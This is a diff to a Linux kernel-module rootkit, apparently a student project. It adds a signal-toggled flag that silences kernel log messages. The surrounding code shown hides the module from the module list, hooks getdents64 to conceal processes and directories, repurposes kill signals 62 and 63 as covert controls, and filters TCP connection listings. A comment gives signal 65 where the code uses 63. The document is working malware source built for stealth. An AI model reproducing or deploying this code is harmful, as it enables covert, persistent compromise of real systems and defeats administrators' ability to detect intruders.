@@ -29,6 +29,8 @@ MODULE_AUTHOR("Alvin, Uwem, Derek (guided with XCellerator");
 MODULE_DESCRIPTION("Rootkit hiding itself");
 MODULE_VERSION("1.00");
 
+// tracking variables: being wordy.
+static int wordy = 0;
 
 // tracking variables: hiding rootkit.
 static int hidden = 0;
@@ -47,11 +49,13 @@ static int dir_hiding = 0;
 void hide_me(void){
 	hiding_spot = THIS_MODULE->list.prev;
 	list_del(&(THIS_MODULE->list));
+	if(wordy)
 	printk(KERN_INFO "Going into hiding...\n");
 }
 
 void show_me(void){
 	list_add(&(THIS_MODULE->list),hiding_spot);
+	if(wordy)
 	printk(KERN_INFO "Coming out of hiding...\n");
 }
 
@@ -90,7 +94,8 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
     if ((memcmp(hide_proc, current_dir->d_name, strlen(hide_proc)) == 0
 				|| memcmp(PREFIX, current_dir->d_name, strlen(hide_proc)) == 0)
 			  && strncmp(hide_proc, "", NAME_MAX) != 0){
-      printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
+			if(wordy)
+			printk(KERN_INFO "Found directory %s.\n", current_dir->d_name);
       if (current_dir == dirent_scratch){
         ret -= current_dir->d_reclen;
         memmove(current_dir, (void*)current_dir + current_dir->d_reclen, ret);
@@ -143,8 +148,14 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 		return 0;
 	}
 	else if (sig == 63){
+		if (wordy)
 		printk(KERN_INFO "Setting hidden pid to %i\n", pid);
 		sprintf(hide_proc, "%d", pid); //usage: kill -65 [PID to hide]
+		return 0;
+	}
+	else if (sig == 62){
+		wordy = !wordy;
+		printk(KERN_INFO "Toggling wordiness: %i\n", wordy);
 		return 0;
 	}
 	return orig_kill(regs);
@@ -166,6 +177,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
   if (sk != (struct sock*)0x1) {
     bytes_written = snprintf(foreign_ip_str, max_ip_len, "%pI4", &sk->sk_daddr);
     if (bytes_written < 0) {
+			if(wordy)
       printk(KERN_INFO "Could not write foreign ip string\n");
     }
 
@@ -173,6 +185,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file* seq, void* v) {
     // local machine.
     bytes_written = snprintf(local_ip_str, max_ip_len, "%pI4", &sk->sk_rcv_saddr);
     if (bytes_written < 0) {
+			if(wordy)
       printk(KERN_INFO "Could not write local ip string\n");
     }
 
@@ -279,13 +292,14 @@ int __init my_init(void){
 	if(err){
 		return err;
 	}
-
+	if(wordy)
 	printk(KERN_INFO "Big kit loaded!\n");
 	return 0;
 }
 
 void __exit my_exit(void){
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	if(wordy)
 	printk(KERN_INFO "exiting Big kit!\n");
 }
 
